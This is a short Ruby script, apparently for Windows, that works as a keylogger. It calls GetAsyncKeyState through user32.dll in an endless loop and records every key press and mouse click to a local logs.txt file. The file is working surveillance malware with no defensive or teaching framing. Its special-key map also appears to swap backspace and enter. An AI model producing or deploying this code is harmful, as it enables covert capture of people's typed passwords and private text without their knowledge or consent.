require 'fiddle/import'
 
module Key
    extend Fiddle::Importer
    dlload("user32.dll")
    extern("short GetAsyncKeyState(int)")
 
    def self.pressed?(code)
          state = self.GetAsyncKeyState(code)
          state != 0 and state & 0x01 == 1
    end
end
 
espc = {
    1 => "[LCLICK]",
    2 => "[RCLICK]",
    8 => "\n",
    13 => "[BCKSPC]",
    16 => "[SHIFT ]",
    17 => "[CTRL  ]",
    18 => "[ALT   ]",
    93 => "[SUPER ]",
    144 => "[NLOCK  ]"
}
 
logs = File.new("logs.txt", "w+")
 
loop do 
    (0..255).each do |code|
          if Key.pressed?(code)
               chr = (code >= 32 && code <= 127) ? code.chr : ""
               logs.print(espc.key?(code) ? espc[code] : chr)
 
          end 
    end
rescue Interrupt => e 
    logs.close
    exit
end
